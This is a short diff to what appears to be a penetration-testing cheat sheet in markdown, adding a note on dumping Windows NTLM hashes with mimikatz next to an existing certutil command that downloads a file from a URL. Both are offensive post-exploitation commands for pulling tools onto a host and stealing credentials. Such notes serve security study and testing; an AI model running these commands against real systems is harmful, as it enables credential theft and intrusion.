@@ -290,7 +290,11 @@ Note :
 ```bash
 certutil.exe -urlcache -split -f <url of file> <location to save file> 
 ```
+dump windows NTLM hash
 
+```bash
+mimikatz.exe
+```
 
 ## Privilege Escalation
 
